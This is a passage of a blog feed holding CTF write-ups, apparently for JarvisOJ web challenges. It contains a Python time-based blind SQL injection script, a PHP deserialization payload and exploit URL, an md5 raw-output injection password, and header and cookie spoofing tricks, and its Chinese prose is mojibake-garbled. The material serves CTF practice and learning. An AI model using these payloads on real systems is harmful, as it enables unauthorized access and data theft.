class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;result = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;cookie = &amp;#123;&amp;#x27;PHPSESSID&amp;#x27;:&amp;#x27;9g4b91gspvooe2up4k2blubbqo&amp;#x27;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;for i in range(1,20):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	for j in range(33,127):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		payload = url + &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(ascii(&lt;span class=&#34;hljs-built_in&#34;&gt;substr&lt;/span&gt;((&amp;#123;&amp;#125;),&amp;#123;&amp;#125;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))=&amp;#123;&amp;#125;,sleep(&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;),&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)--+&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.format(data,i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		print(chr(j))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		t1 = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		r = requests.get(payload,cookies = cookie)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		t2 = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		if(t2-t1&amp;gt;=5):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			result+=chr(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			print(result)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ‹¿åˆ°è´¦å·å¯†ç ï¼Œä½†æ˜¯ç™»é™†æç¤ºé”™è¯¯ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ï¼Œå¤šè·‘å‡ æ¬¡æ‰æ‹¿åˆ°äº†æ­£ç¡®çš„è´¦å·å¯†ç ï¼šcosmos^f1FXOCnj26Fkadzt4Sqynf6O7CgR&lt;/p&gt;
</content>
        <updated>2020-02-05T15:09:06.000Z</updated>
    </entry>
    <entry>
        <id>http://blog.m1n.me/2019/11/27/JarvisOj/</id>
        <title>JarvisOj</title>
        <link rel="alternate" href="http://blog.m1n.me/2019/11/27/JarvisOj/"/>
        <content type="html">&lt;p&gt;&lt;a href=&#34;https://www.jarvisoj.com/&#34;&gt;https://www.jarvisoj.com/&lt;/a&gt;&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;

&lt;h1 id=&#34;Web&#34;&gt;&lt;a href=&#34;#Web&#34; class=&#34;headerlink&#34; title=&#34;Web&#34;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&#34;LocalHost&#34;&gt;&lt;a href=&#34;#LocalHost&#34; class=&#34;headerlink&#34; title=&#34;LocalHost&#34;&gt;&lt;/a&gt;LocalHost&lt;/h2&gt;&lt;p&gt;æŠ“åŒ…åŠ ä¸€ä¸ªâ€œX-Forwarded-For: 127.0.0.1â€å®Œäº‹&lt;/p&gt;
&lt;h2 id=&#34;PORT51&#34;&gt;&lt;a href=&#34;#PORT51&#34; class=&#34;headerlink&#34; title=&#34;PORT51&#34;&gt;&lt;/a&gt;PORT51&lt;/h2&gt;&lt;p&gt;åˆšå¼€å§‹ä»¥ä¸ºæ”¹ç«¯å£å°±å®Œäº†ï¼Œï¼Œåæ¥å‘ç°æ˜¯æˆ‘å¤ªèœäº†ï¼Œè¦æ”¹æˆ‘ä»¬çš„è®¿é—®ç«¯å£&lt;br&gt;&lt;code&gt;curl --loacl-port 51 http://web.jarvisoj.com:32770/&lt;/code&gt;å°±æ‹¿åˆ°äº†flagï¼Œï¼Œå­¦åˆ°äº†&lt;/p&gt;
&lt;h2 id=&#34;ç¥ç›¾å±€çš„ç§˜å¯†&#34;&gt;&lt;a href=&#34;#ç¥ç›¾å±€çš„ç§˜å¯†&#34; class=&#34;headerlink&#34; title=&#34;ç¥ç›¾å±€çš„ç§˜å¯†&#34;&gt;&lt;/a&gt;ç¥ç›¾å±€çš„ç§˜å¯†&lt;/h2&gt;&lt;p&gt;è¿›å»ä»¥åå°±æ˜¯ä¸€å¼ å›¾ç‰‡&lt;br&gt;å…ˆview-sourceä¸€ä¸‹çœ‹åˆ°äº†ï¼š&lt;br&gt;&lt;code&gt;&amp;lt;img src=&amp;quot;showimg.php?img=c2hpZWxkLmpwZw==&amp;quot; width=&amp;quot;100%&amp;quot;/&amp;gt;&lt;/code&gt;&lt;br&gt;çœ‹åˆ°äº†ä¸€ä¸ªshowimg.phpï¼Œçœ‹æ ·å­åº”è¯¥å¯ä»¥ç”¨imgè¿™ä¸ªå‚æ•°æ¥è¯»æ–‡ä»¶ï¼Œå…ˆè¯»ä¸€ä¸‹showimg.phpè¿™ä¸ªæ–‡ä»¶ï¼Œæ²¡çœ‹åˆ°å•¥æœ‰ç”¨çš„ä¸œè¥¿ï¼Œå†çœ‹ä¸€ä¸‹index.phpçœ‹åˆ°äº†æœ‰ä¸€ä¸ªååºåˆ—åŒ–çš„ç‚¹ï¼Œçœ‹æ ·å­æ˜¯ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œæºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;require_once&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;shield.php&amp;#x27;&lt;/span&gt;);&lt;br&gt;	&lt;span class=&#34;hljs-variable&#34;&gt;$x&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Shield();&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;class&amp;#x27;&lt;/span&gt;]) &amp;amp;&amp;amp; &lt;span class=&#34;hljs-variable&#34;&gt;$g&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;class&amp;#x27;&lt;/span&gt;];&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;hljs-keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$g&lt;/span&gt;)) &amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-variable&#34;&gt;$x&lt;/span&gt; = unserialize(&lt;span class=&#34;hljs-variable&#34;&gt;$g&lt;/span&gt;);&lt;br&gt;	&amp;#125;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$x&lt;/span&gt;-&amp;gt;readfile();&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;çœ‹åˆ°äº†shield.phpï¼Œè¯»ä¸€ä¸‹çœ‹çœ‹ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-comment&#34;&gt;//flag is in pctf.php&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Shield&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;;&lt;br&gt;		&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;			&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt; -&amp;gt; file = &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;;&lt;br&gt;		&amp;#125;&lt;br&gt;		&lt;br&gt;		&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;readfile&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;			&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;hljs-keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file) &amp;amp;&amp;amp; stripos(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;..&amp;#x27;&lt;/span&gt;)===&lt;span class=&#34;hljs-literal&#34;&gt;FALSE&lt;/span&gt;  &lt;br&gt;			&amp;amp;&amp;amp; stripos(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;)===&lt;span class=&#34;hljs-literal&#34;&gt;FALSE&lt;/span&gt; &amp;amp;&amp;amp; stripos(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\\&amp;#x27;&lt;/span&gt;)==&lt;span class=&#34;hljs-literal&#34;&gt;FALSE&lt;/span&gt;) &amp;#123;&lt;br&gt;				&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; @file_get_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file);&lt;br&gt;			&amp;#125;&lt;br&gt;		&amp;#125;&lt;br&gt;	&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Shield&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;pctf.php&amp;#x27;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$c&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Shield();&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$c&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;â€œview-source:&lt;a href=&#34;http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:%7Bs:4:%22file%22;s:8:%22pctf.php%22;%7D&amp;quot;&#34;&gt;http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}&amp;quot;&lt;/a&gt;&lt;br&gt;å°±æ‹¿åˆ°äº†flag&lt;/p&gt;
&lt;h2 id=&#34;Login&#34;&gt;&lt;a href=&#34;#Login&#34; class=&#34;headerlink&#34; title=&#34;Login&#34;&gt;&lt;/a&gt;Login&lt;/h2&gt;&lt;p&gt;æç¤ºè¯´éœ€è¦å¯†ç æ‰èƒ½æ‹¿åˆ°flagï¼Œï¼Œä½†æ˜¯æµ‹è¯•äº†ä¸€ä¸‹å‘ç°å½“è¾“å…¥åŒå¼•å·çš„æ—¶å€™ä¼šæŠ¥sqlé”™è¯¯ï¼Œåº”è¯¥æ˜¯å­˜åœ¨sqlæ³¨å…¥ï¼Œä½†æ˜¯æµ‹è¯•äº†å¥½ä¹…æ²¡å‘ç°æœ‰ä»€ä¹ˆç”¨ï¼Œï¼Œçœ‹äº†ä¸€çœ¼wpè¦å…ˆæŠ“åŒ…ï¼Œï¼Œåœ¨headé‡Œé¢æœ‰hintã€‚ã€‚ã€‚&lt;br&gt;â€˜Hint: â€œselect * from &lt;code&gt;admin&lt;/code&gt; where password=â€™â€.md5($pass,true).â€â€˜â€œâ€˜&lt;br&gt;ç„¶åæƒ³åˆ°åº”è¯¥æ˜¯md5çš„å®‰å…¨é—®é¢˜ï¼Œ0eå¼€å¤´çš„é—®é¢˜åº”è¯¥æ˜¯ä¸å­˜åœ¨ï¼Œå‚è€ƒäº†ä¸€ä¸‹&lt;a href=&#34;https://www.cnblogs.com/piaomiaohongchen/p/10659359.html&#34;&gt;https://www.cnblogs.com/piaomiaohongchen/p/10659359.html&lt;/a&gt;&lt;br&gt;è¯•äº†ä¸€ä¸‹æ–‡ä¸­ç»™å‡ºçš„å¯†ç ffifdyopå°±æ‹¿åˆ°äº†flag&lt;/p&gt;
&lt;h2 id=&#34;admin&#34;&gt;&lt;a href=&#34;#admin&#34; class=&#34;headerlink&#34; title=&#34;admin&#34;&gt;&lt;/a&gt;admin&lt;/h2&gt;&lt;p&gt;æ‰“å¼€ç½‘é¡µåªæœ‰ä¸€ä¸ªhello worldï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç æ²¡çœ‹åˆ°å•¥æœ‰ç”¨çš„ä¸œè¥¿ï¼Œäºæ˜¯å°±çœ‹çœ‹æœ‰æ²¡æœ‰robots.txtï¼Œçœ‹åˆ°äº†admin_s3cr3t.phpï¼Œè®¿é—®æ‹¿åˆ°å‡çš„flagï¼Œæƒ³äº†æƒ³åº”è¯¥æ˜¯è·Ÿcookieæœ‰å…³ï¼Œäºæ˜¯å°±æŠ“åŒ…çœ‹çœ‹ï¼Œåº”è¯¥æ˜¯åœ¨cookieæœ‰åˆ¤æ–­æ˜¯ä¸æ˜¯adminï¼Œä½†æ˜¯æˆ‘æŠ“åˆ°çš„åŒ…æ²¡æœ‰cookieï¼Œåè€Œæ˜¯çœ‹åˆ°ä¸€ä¸ªç±»ä¼¼äºbase64çš„ä¸€ä¸²ç¼–ç ï¼Œå°±ä¸€ç›´åœ¨æè¿™ä¸ªä¹Ÿæ²¡æå‡ºä¸ªå•¥ï¼Œåæ¥çœ‹äº†ä¸€ä¸‹wpåˆ«äººå°±æœ‰æŠ“åˆ°admin=0.ã€‚ã€‚ã€‚æˆ‘å°±é‡æ–°åˆ·æ–°é‡æ–°æŠ“äº†ä¸€ä¸‹åŒ…æ‰çœ‹åˆ°äº†è¿™ç©æ„ï¼Œï¼Œæ”¹æˆ1å°±æ‹¿åˆ°äº†flagï¼Œçœ‹æ¥åº”è¯¥æ˜¯è¿˜æ²¡æœ‰è®¾ç½®cookieå°±è¢«æˆ‘æŠ“åŒ…äº†ï¼Œï¼Œï¼Œå®³ï¼Œä¸‹æ¬¡æ³¨æ„&lt;/p&gt;
&lt;h2 id=&#34;IN-A-mess&#34;&gt;&lt;a href=&#34;#IN-A-mess&#34; class=&#34;headerlink&#34; title=&#34;IN A mess&#34;&gt;&lt;/a&gt;IN A mess&lt;/h2&gt;&lt;p&gt;1.æŸ¥çœ‹ç½‘é¡µæºä»£ç è®©æˆ‘è®¿é—®index.phpsï¼Œçœ‹åˆ°æºç &lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;error_reporting(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;!--index.phps--&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;])&lt;br&gt;&amp;#123;&lt;br&gt;	header(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Location: index.php?id=1&amp;#x27;&lt;/span&gt;);&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;exit&lt;/span&gt;();&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$id&lt;/span&gt;=&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;=&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$b&lt;/span&gt;=&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(stripos(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;))&lt;br&gt;&amp;#123;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Hahahahahaha&amp;#x27;&lt;/span&gt;;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; ;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt; = @file_get_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt;==&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1112 is a nice lab!&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$id&lt;/span&gt;==&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; strlen(&lt;span class=&#34;hljs-variable&#34;&gt;$b&lt;/span&gt;)&amp;gt;&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; eregi(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;111&amp;quot;&lt;/span&gt;.substr(&lt;span class=&#34;hljs-variable&#34;&gt;$b&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;),&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1114&amp;quot;&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; substr(&lt;span class=&#34;hljs-variable&#34;&gt;$b&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)!=&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;)&lt;br&gt;&amp;#123;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;require&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag.txt&amp;quot;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&lt;br&gt;&amp;#123;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;work harder!harder!harder!&amp;quot;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°ä¸»è¦å°±æ˜¯é‚£ä¸€å±‚if&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;$dataç”¨php://inputä¼ è¿›å»&lt;/li&gt;
